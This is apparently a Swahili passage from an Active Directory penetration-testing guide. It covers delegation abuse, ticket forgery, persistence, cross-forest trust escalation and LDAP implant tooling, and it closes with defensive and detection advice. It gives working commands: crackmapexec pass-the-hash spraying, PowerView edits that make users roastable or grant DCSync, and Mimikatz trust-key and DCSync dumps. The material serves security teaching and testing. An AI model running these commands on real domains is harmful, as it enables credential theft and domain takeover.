Ikiwa una **hash** au **password** ya **local admin**, unapaswa kujaribu **ku-login locally** kwenye **PC** nyingine ukitumia hiyo.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Kumbuka kwamba hii ina **kelele** nyingi na **LAPS** ingeweza **kupunguza athari** yake.

### Matumizi Mabaya ya MSSQL na Trusted Links

Ikiwa mtumiaji ana ruhusa za **kufikia MSSQL instances**, anaweza kuweza kuitumia **kutekeleza commands** kwenye MSSQL host (ikiwa inaendeshwa kama SA), **kuiba** NetNTLM **hash**, au hata kufanya **relay** **attack**.\
Ikiwa MSSQL instance inaaminika kupitia database link na instance nyingine, mtumiaji aliye na ruhusa kwenye database iliyounganishwa anaweza kuweza **kutumia trust relationship kutekeleza queries kwenye instance nyingine**. Trust hizi zinaweza kuunganishwa kwa mfululizo na hatimaye kufikia database iliyosanidiwa vibaya ambapo mtumiaji anaweza kutekeleza commands.\
**Links kati ya databases hufanya kazi hata katika forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Matumizi mabaya ya IT asset/deployment platforms

Third-party inventory na deployment suites mara nyingi hufichua njia zenye nguvu za kufikia credentials na code execution. Tazama:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ukigundua Computer object yoyote yenye attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) na una domain privileges kwenye computer hiyo, utaweza kudump TGTs kutoka kwenye memory za users wote wanaoingia kwenye computer hiyo.\
Kwa hiyo, ikiwa **Domain Admin anaingia kwenye computer**, utaweza kudump TGT yake na kujifanya yeye kwa kutumia [Pass the Ticket](pass-the-ticket.md).\
Kwa sababu ya constrained delegation unaweza hata **kucompromise Print Server** automatically (kwa matumaini itakuwa DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ikiwa user au computer inaruhusiwa kwa "Constrained Delegation", itaweza **kujifanya user yeyote ili kufikia services fulani kwenye computer**.\
Kisha, uki **compromise hash** ya user/computer huyu, utaweza **kujifanya user yeyote** (hata domain admins) ili kufikia services fulani.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Kuwa na privilege ya **WRITE** kwenye Active Directory object ya remote computer kunawezesha kupata code execution yenye **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Matumizi Mabaya ya Permissions/ACLs

User aliyecompromised anaweza kuwa na **privileges za kuvutia kwenye domain objects fulani** zinazoweza kukuruhusu kufanya **lateral movement**/ku **escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Matumizi mabaya ya Printer Spooler service

Kugundua **Spool service inayosikiliza** ndani ya domain kunaweza **kutumiwa vibaya** ili **kupata credentials mpya** na **ku-escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Matumizi mabaya ya third-party sessions

Ikiwa **users wengine** **wanafikia** mashine **iliyo-compromised**, inawezekana **kukusanya credentials kutoka memory** na hata **kuingiza beacons kwenye processes zao** ili kujifanya wao.\
Kwa kawaida users watafikia mfumo kupitia RDP, kwa hiyo hapa kuna jinsi ya kufanya attacks kadhaa kwenye third-party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** hutoa mfumo wa kusimamia **local Administrator password** kwenye computers zilizojiunga na domain, na kuhakikisha kuwa password hiyo ni **randomized**, ya kipekee, na **inabadilishwa** mara kwa mara. Password hizi huhifadhiwa kwenye Active Directory na access hudhibitiwa kupitia ACLs kwa users walioidhinishwa pekee. Ukiwa na permissions za kutosha za kufikia password hizi, kufanya pivot kwenda kwenye computers nyingine huwa kunawezekana.


{{#ref}}
laps.md
{{#endref}}

### Kuiba Certificates

**Kukusanya certificates** kutoka kwenye mashine iliyo-compromised kunaweza kuwa njia ya ku-escalate privileges ndani ya environment:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Matumizi Mabaya ya Certificate Templates

Ikiwa **templates zenye vulnerabilities** zimesanidiwa, inawezekana kuzitumia vibaya ili ku-escalate privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation kwa kutumia high privilege account

### Kudump Domain Credentials

Mara tu unapopata privileges za **Domain Admin**, au bora zaidi **Enterprise Admin**, unaweza **kudump** **domain database**: _ntds.dit_.

[**Maelezo zaidi kuhusu DCSync attack yanaweza kupatikana hapa**](dcsync.md).

[**Maelezo zaidi kuhusu jinsi ya kuiba NTDS.dit yanaweza kupatikana hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc kama Persistence

Baadhi ya techniques zilizojadiliwa hapo awali zinaweza kutumika kwa persistence.\
Kwa mfano unaweza:

- Kuwafanya users wawe vulnerable kwa [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Kuwafanya users wawe vulnerable kwa [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Kumpa user privileges za [**DCSync**](#dcsync)

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** huunda **Ticket Granting Service (TGS) ticket halali** kwa service maalum kwa kutumia **NTLM hash** (kwa mfano, **hash ya PC account**). Njia hii hutumiwa **kufikia privileges za service**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** inahusisha attacker kupata **NTLM hash ya krbtgt account** katika mazingira ya Active Directory (AD). Account hii ni maalum kwa sababu hutumiwa kusign **Ticket Granting Tickets (TGTs)** zote, ambazo ni muhimu kwa authentication ndani ya AD network.

Mara attacker anapopata hash hii, anaweza kuunda **TGTs** kwa account yoyote atakayo (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hizi ni kama golden tickets zilizoforgiwa kwa njia ambayo **hupita common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Kuwa na certificates za account au kuweza kuzi-request** ni njia nzuri sana ya kuendelea kuwepo kwenye account ya user (hata akibadilisha password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Kutumia certificates pia kunawezesha persistence yenye privileges za juu ndani ya domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Object ya **AdminSDHolder** katika Active Directory huhakikisha usalama wa **privileged groups** (kama Domain Admins na Enterprise Admins) kwa kuweka **Access Control List (ACL)** ya kawaida kwenye groups hizi ili kuzuia mabadiliko yasiyoidhinishwa. Hata hivyo, feature hii inaweza kutumiwa vibaya; ikiwa attacker atabadilisha ACL ya AdminSDHolder ili kumpa user wa kawaida access kamili, user huyo hupata udhibiti mkubwa juu ya privileged groups zote. Hatua hii ya usalama, iliyokusudiwa kulinda, inaweza hivyo kuleta athari kinyume na lengo lake na kuruhusu access isiyofaa isipofuatiliwa kwa karibu.

[**Maelezo zaidi kuhusu AdminDSHolder Group hapa.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Ndani ya kila **Domain Controller (DC)**, kuna account ya **local administrator**. Kwa kupata admin rights kwenye mashine kama hiyo, local Administrator hash inaweza kutolewa kwa kutumia **mimikatz**. Baada ya hapo, registry modification inahitajika ili **kuwezesha matumizi ya password hii**, na hivyo kuruhusu remote access kwenye local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Unaweza **kumpa** **user** baadhi ya **special permissions** kwenye domain objects maalum ambazo zitamwezesha user huyo **ku-escalate privileges baadaye**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** hutumika **kuhifadhi** **permissions** ambazo **object** inazo **juu ya** **object** nyingine. Ikiwa unaweza tu **kufanya** **mabadiliko madogo** kwenye **security descriptor** ya object, unaweza kupata privileges za kuvutia sana juu ya object hiyo bila kuhitaji kuwa mwanachama wa privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Tumia vibaya auxiliary class ya `dynamicObject` kuunda principals/GPOs/DNS records za muda mfupi zenye `entryTTL`/`msDS-Entry-Time-To-Die`; hujifuta zenyewe bila tombstones, zikifuta ushahidi wa LDAP huku zikiziacha orphan SIDs, broken `gPLink` references, au cached DNS responses (kwa mfano, AdminSDHolder ACE pollution au redirects za malicious `gPCFileSysPath`/AD-integrated DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Badilisha **LSASS** kwenye memory ili kuanzisha **universal password**, na hivyo kutoa access kwa domain accounts zote.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Jifunze SSP (Security Support Provider) ni nini hapa.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Unaweza kuunda **SSP yako mwenyewe** ili **kunasa** kwa **clear text** **credentials** zinazotumiwa kufikia mashine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Husajili **Domain Controller mpya** kwenye AD na kuitumia **kusukuma attributes** (SIDHistory, SPNs...) kwenye objects zilizochaguliwa **bila kuacha logs** zozote kuhusu **modifications**. Unahitaji privileges za **DA** na lazima uwe ndani ya **root domain**.\
Kumbuka kwamba ukitumia data isiyo sahihi, logs mbaya sana zitaonekana.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Hapo awali tulijadili jinsi ya ku-escalate privileges ukiwa na **permissions za kutosha za kusoma LAPS passwords**. Hata hivyo, password hizi pia zinaweza kutumika **kudumisha persistence**.\
Tazama:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft huichukulia **Forest** kama mpaka wa usalama. Hii inamaanisha kwamba **kucompromise domain moja kunaweza kusababisha Forest nzima kucompromised**.<sup>[[1]](#references)</sup>

### Basic Information

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ni security mechanism inayomwezesha user kutoka **domain** moja kufikia resources katika **domain** nyingine. Kimsingi huunda muunganisho kati ya authentication systems za domains hizo mbili, na kuruhusu authentication verifications zipite bila matatizo. Domains zinapoweka trust, hubadilishana na kuhifadhi **keys** maalum ndani ya **Domain Controllers (DCs)** zao, ambazo ni muhimu kwa uadilifu wa trust hiyo.

Katika hali ya kawaida, user anapokusudia kufikia service katika **trusted domain**, lazima kwanza aombe ticket maalum inayoitwa **inter-realm TGT** kutoka DC ya domain yake. TGT hii husimbwa kwa **key** ya pamoja ambayo domains zote mbili zimekubaliana kuitumia. Kisha user huwasilisha TGT hii kwa **DC ya trusted domain** ili kupata service ticket (**TGS**). Baada ya trusted domain's DC kuthibitisha inter-realm TGT, hutoa TGS inayompa user access kwenye service.

**Steps**:

1. **Client computer** katika **Domain 1** huanzisha mchakato kwa kutumia **NTLM hash** yake kuomba **Ticket Granting Ticket (TGT)** kutoka kwa **Domain Controller (DC1)** yake.
2. DC1 hutoa TGT mpya ikiwa client imethibitishwa kwa mafanikio.
3. Kisha client huomba **inter-realm TGT** kutoka DC1, ambayo inahitajika kufikia resources katika **Domain 2**.
4. Inter-realm TGT husimbwa kwa **trust key** inayoshirikiwa kati ya DC1 na DC2 kama sehemu ya two-way domain trust.
5. Client hupeleka inter-realm TGT kwa **Domain Controller (DC2)** wa **Domain 2**.
6. DC2 huthibitisha inter-realm TGT kwa kutumia shared trust key yake na, ikiwa ni halali, hutoa **Ticket Granting Service (TGS)** kwa server ya Domain 2 ambayo client inataka kufikia.
7. Hatimaye, client huwasilisha TGS hii kwa server, ambayo imesimbwa kwa server’s account hash, ili kupata access kwenye service katika Domain 2.

### Different trusts

Ni muhimu kutambua kwamba **trust inaweza kuwa ya upande 1 au pande 2**. Katika chaguo la pande 2, domains zote mbili huaminiana, lakini katika trust ya **upande 1**, mojawapo ya domains itakuwa **trusted** na nyingine itakuwa **trusting** domain. Katika hali ya mwisho, **utaweza tu kufikia resources ndani ya trusting domain kutoka trusted domain**.

Ikiwa Domain A inaiamini Domain B, A ndiyo trusting domain na B ndiyo trusted domain. Zaidi ya hayo, katika **Domain A**, hii itakuwa **Outbound trust**; na katika **Domain B**, itakuwa **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Huu ni mpangilio wa kawaida ndani ya forest ileile, ambapo child domain hupata automatically two-way transitive trust na parent domain yake. Kimsingi, hii inamaanisha kwamba authentication requests zinaweza kupita bila matatizo kati ya parent na child.
- **Cross-link Trusts**: Zinazojulikana kama "shortcut trusts," huwekwa kati ya child domains ili kuharakisha referral processes. Katika forests changamano, authentication referrals kwa kawaida lazima zipande hadi forest root kisha zishuke hadi target domain. Kwa kuunda cross-links, safari hiyo hupunguzwa, jambo ambalo ni muhimu hasa katika environments zilizosambaa kijiografia.
- **External Trusts**: Hizi huwekwa kati ya domains tofauti zisizohusiana na kwa asili si transitive. Kulingana na [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts ni muhimu kwa kufikia resources katika domain iliyo nje ya forest ya sasa ambayo haijaunganishwa kupitia forest trust. Usalama huimarishwa kwa SID filtering kupitia external trusts.
- **Tree-root Trusts**: Trust hizi huanzishwa automatically kati ya forest root domain na tree root mpya iliyoongezwa. Ingawa hazipatikani mara kwa mara, tree-root trusts ni muhimu kwa kuongeza domain trees mpya kwenye forest, na kuziwezesha ziendelee kutumia domain name ya kipekee huku zikihakikisha two-way transitivity. Maelezo zaidi yanaweza kupatikana katika [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Aina hii ya trust ni two-way transitive trust kati ya forest root domains mbili, na pia hutumia SID filtering kuimarisha hatua za usalama.
- **MIT Trusts**: Trust hizi huwekwa na Kerberos domains zisizo za Windows zinazotii [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts ni maalum zaidi na hulenga environments zinazohitaji integration na Kerberos-based systems zilizo nje ya Windows ecosystem.

#### Tofauti nyingine katika **trusting relationships**

- Trust relationship inaweza pia kuwa **transitive** (A inaamini B, B inaamini C, kisha A inaamini C) au **non-transitive**.
- Trust relationship inaweza kuwekwa kama **bidirectional trust** (zinaaminiana) au **one-way trust** (moja pekee inaiamini nyingine).

### Attack Path

1. **Enumerate** trusting relationships
2. Kagua ikiwa **security principal** yoyote (user/group/computer) ina **access** kwenye resources za **domain nyingine**, labda kupitia ACE entries au kwa kuwa kwenye groups za domain nyingine. Tafuta **relationships across domains** (huenda trust iliundwa kwa sababu hii).
1. Kerberoast katika hali hii inaweza kuwa option nyingine.
3. **Compromise** **accounts** zinazoweza kufanya **pivot** kupitia domains.

Attackers wenye access kwenye resources za domain nyingine wanaweza kutumia mechanisms tatu kuu:

- **Local Group Membership**: Principals wanaweza kuongezwa kwenye local groups kwenye machines, kama group ya “Administrators” kwenye server, na kuwapa udhibiti mkubwa juu ya mashine hiyo.
- **Foreign Domain Group Membership**: Principals wanaweza pia kuwa members wa groups ndani ya foreign domain. Hata hivyo, ufanisi wa njia hii hutegemea aina ya trust na scope ya group.
- **Access Control Lists (ACLs)**: Principals wanaweza kutajwa katika **ACL**, hasa kama entities ndani ya **ACEs** katika **DACL**, na hivyo kupewa access kwenye resources maalum. Kwa wanaotaka kuelewa kwa undani mechanics za ACLs, DACLs, na ACEs, whitepaper inayoitwa “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ni resource muhimu sana.<sup>[[17]](#references)</sup>

### Tafuta users/groups wa nje wenye permissions

Unaweza kukagua **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** ili kupata foreign security principals katika domain. Hawa watakuwa user/group kutoka **external domain/forest**.

Unaweza kukagua hili katika **Bloodhound** au kwa kutumia powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Njia nyingine za enumerate domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Kuna **trusted keys 2**, moja ya _Child --> Parent_ na nyingine ya _Parent_ --> _Child_.\
> Unaweza kupata ile inayotumiwa na domain ya sasa kwa:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate hadi Enterprise admin katika child/parent domain kwa kutumia trust pamoja na SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Kuelewa jinsi Configuration Naming Context (NC) inavyoweza kutumiwa ni muhimu. Configuration NC hutumika kama repository kuu ya data za configuration katika forest nzima kwenye mazingira ya Active Directory (AD). Data hii inareplicate kwa kila Domain Controller (DC) ndani ya forest, huku DC zenye uwezo wa kuandikwa zikidumisha nakala inayoweza kuandikwa ya Configuration NC. Ili kutumia hili, lazima mtu awe na **SYSTEM privileges kwenye DC**, ikiwezekana child DC.

**Link GPO to root DC site**

Sites container ya Configuration NC ina taarifa kuhusu sites za computer zote zilizojiunga na domain ndani ya AD forest. Kwa kutumia SYSTEM privileges kwenye DC yoyote, attackers wanaweza ku-link GPOs kwenye root DC sites. Hatua hii inaweza ku-compromise root domain kwa kubadilisha policies zinazotumika kwenye sites hizi.

Kwa taarifa za kina, mtu anaweza kuchunguza utafiti kuhusu [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromise any gMSA in the forest**

Attack vector moja inalenga gMSAs zenye privileges ndani ya domain. KDS Root key, ambayo ni muhimu kwa kuhesabu passwords za gMSAs, huhifadhiwa ndani ya Configuration NC. Kwa SYSTEM privileges kwenye DC yoyote, inawezekana kufikia KDS Root key na kuhesabu passwords za gMSA yoyote katika forest nzima.

Uchambuzi wa kina na mwongozo wa hatua kwa hatua unapatikana katika:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Delegated MSA attack ya ziada (BadSuccessor – kutumia vibaya migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Utafiti wa ziada wa nje: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Njia hii inahitaji subira, kwa kusubiri kuundwa kwa AD objects mpya zenye privileges. Kwa SYSTEM privileges, attacker anaweza kubadilisha AD Schema ili kumpa user yoyote control kamili juu ya classes zote. Hili linaweza kusababisha access na control isiyoidhinishwa kwenye AD objects zitakazoundwa baadaye.

Maelezo zaidi yanapatikana kwenye [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability inalenga control ya Public Key Infrastructure (PKI) objects ili kuunda certificate template inayowezesha authentication kama user yoyote ndani ya forest. Kwa kuwa PKI objects zinapatikana ndani ya Configuration NC, ku-compromise child DC inayoweza kuandikwa huwezesha utekelezaji wa ESC5 attacks.

Maelezo zaidi yanaweza kusomwa kwenye [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Katika mazingira yasiyo na ADCS, attacker anaweza kusanidi components zinazohitajika, kama ilivyoelezwa kwenye [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) au bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Katika hali hii **domain yako inaaminika** na domain ya nje inayokupa **ruhusa zisizojulikana** juu yake. Utahitaji kubaini **ni principals gani wa domain yako walio na access gani juu ya domain ya nje**, kisha ujaribu kui-exploit:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Katika hali hii, **domain yako** ina **trust** ya baadhi ya **privileges** kwa principal kutoka **domains** tofauti.

Hata hivyo, wakati **domain inaaminiwa** na domain inayoamini, domain inayoaminiwa **huunda user** mwenye **jina linalotabirika**, na hutumia **trusted password** kama **password** yake. Hii ina maana kwamba inawezekana **kuingia kwa user kutoka domain inayoamini ili kuingia kwenye domain inayoaminiwa**, kuifanya enumeration na kujaribu kuongeza privileges zaidi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Njia nyingine ya ku-compromise domain inayoaminiwa ni kupata [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) iliyoundwa katika **mwelekeo ulio kinyume** wa domain trust (jambo ambalo si la kawaida sana).

Njia nyingine ya ku-compromise domain inayoaminiwa ni kusubiri kwenye machine ambayo **user kutoka domain inayoaminiwa anaweza kuifikia**, ili ku-login kupitia **RDP**. Kisha attacker anaweza ku-inject code kwenye process ya RDP session na **ku-access origin domain ya victim** kutoka hapo.\
Zaidi ya hayo, ikiwa **victim alikuwa amemount hard drive yake**, attacker anaweza, kupitia process ya **RDP session**, kuhifadhi **backdoors** kwenye **startup folder ya hard drive**. Technique hii inaitwa **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigation ya domain trust abuse

### **SID Filtering:**

- Hatari ya attacks zinazotumia SID history attribute kwenye forest trusts hupunguzwa na SID Filtering, ambayo imewashwa kwa default kwenye inter-forest trusts zote. Hii inategemea dhana kwamba intra-forest trusts ni salama, ikizingatia forest, badala ya domain, kuwa security boundary kulingana na msimamo wa Microsoft.
- Hata hivyo, kuna changamoto: SID filtering inaweza kuvuruga applications na user access, hivyo wakati mwingine huzimwa.

### **Selective Authentication:**

- Kwa inter-forest trusts, kutumia Selective Authentication huhakikisha kwamba users kutoka forests hizo mbili hawa-authenticateki automatically. Badala yake, permissions za wazi zinahitajika ili users waweze ku-access domains na servers ndani ya trusting domain au forest.
- Ni muhimu kutambua kwamba hatua hizi hazilindi dhidi ya exploitation ya writable Configuration Naming Context (NC) au attacks dhidi ya trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-based AD Abuse kutoka kwa On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) ina-re-implement bloodyAD-style LDAP primitives kama x64 Beacon Object Files zinazo-run kikamilifu ndani ya on-host implant (kwa mfano, Adaptix C2). Operators hu-compile pack kwa `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, hu-load `ldap.axs`, kisha huita `ldap <subcommand>` kutoka kwenye beacon. Traffic yote hupitia current logon security context kupitia LDAP (389), ikiwa na signing/sealing, au LDAPS (636) ikiwa na auto certificate trust; kwa hivyo hakuna socks proxies au disk artifacts zinazohitajika.<sup>[[4]](#references)</sup>

### LDAP enumeration upande wa implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, na `get-groupmembers` hutatua short names/OU paths kuwa full DNs na kutoa objects zinazolingana.
- `get-object`, `get-attribute`, na `get-domaininfo` huchukua arbitrary attributes (ikiwemo security descriptors), pamoja na forest/domain metadata kutoka `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, na `get-rbcd` huonyesha roasting candidates, delegation settings, na descriptors zilizopo za [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) moja kwa moja kutoka LDAP.
- `get-acl` na `get-writable --detailed` huchanganua DACL ili kuorodhesha trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), na inheritance, na hivyo kutoa targets za haraka kwa ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) humwezesha operator kuandaa principals au machine accounts mpya popote ambapo OU rights zinapatikana. `add-groupmember`, `set-password`, `add-attribute`, na `set-attribute` huteka moja kwa moja targets mara write-property rights zinapopatikana.
- Commands zinazolenga ACL kama `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, na `add-dcsync` hubadilisha WriteDACL/WriteOwner kwenye AD object yoyote kuwa password resets, udhibiti wa group membership, au DCSync replication privileges bila kuacha PowerShell/ADSI artifacts. `remove-*` counterparts husafisha ACEs zilizodungwa.

### Delegation, roasting, na Kerberos abuse

- `add-spn`/`set-spn` humfanya compromised user awe Kerberoastable mara moja; `add-asreproastable` (UAC toggle) humuweka kwa AS-REP roasting bila kugusa password.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) huandika upya `msDS-AllowedToDelegateTo`, UAC flags, au `msDS-AllowedToActOnBehalfOfOtherIdentity` kutoka kwenye beacon, kuwezesha constrained/unconstrained/RBCD attack paths na kuondoa hitaji la remote PowerShell au RSAT.

### sidHistory injection, OU relocation, na attack surface shaping

- `add-sidhistory` hudunga privileged SIDs kwenye SID history ya controlled principal (tazama [SID-History Injection](sid-history-injection.md)), ikitoa stealthy access inheritance kikamilifu kupitia LDAP/LDAPS.
- `move-object` hubadilisha DN/OU ya computers au users, ikimruhusu attacker kuvuta assets kwenda kwenye OUs ambako delegated rights tayari zipo kabla ya kutumia vibaya `set-password`, `add-groupmember`, au `add-spn`.
- Commands za removal zilizowekewa scope kwa uangalifu (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, n.k.) huruhusu rollback ya haraka baada ya operator kuvuna credentials au persistence, na kupunguza telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Baadhi ya General Defenses

[**Jifunze zaidi kuhusu jinsi ya kulinda credentials hapa.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Inapendekezwa kwamba Domain Admins waruhusiwe tu ku-login kwenye Domain Controllers, ili kuepuka matumizi yao kwenye hosts nyingine.
- **Service Account Privileges**: Services hazipaswi kuendeshwa kwa Domain Admin (DA) privileges ili kudumisha security.
- **Temporal Privilege Limitation**: Kwa tasks zinazohitaji DA privileges, muda wake unapaswa kupunguzwa. Hili linaweza kufikiwa kwa: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Kagua Event IDs 2889/3074/3075 na kisha enforce LDAP signing pamoja na LDAPS channel binding kwenye DCs/clients ili kuzuia LDAP MITM/relay attempts.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

Ikiwa unataka kugundua AD tradecraft ya kawaida, **usitegemee tu artifacts zinazodhibitiwa na operator** kama renamed binaries, service names, temp batch files, au output paths. Weka baseline ya jinsi Windows clients halali huunda traffic ya [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, na WMI, kisha tafuta **implementation quirks** zinazobaki hata baada ya operator kuhariri `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, au `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **High-confidence standalone candidates** (baada ya kuhalalisha dhidi ya baseline yako mwenyewe):
- Authenticated DCE/RPC inayotumia `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding iliyojaa `0xff`
- LDAP Kerberos binds zinazoweka raw Kerberos `AP-REQ` moja kwa moja ndani ya SPNEGO `mechToken`
- SMB2/3 negotiate requests zenye `ClientGuid` zinazoonekana kama ASCII
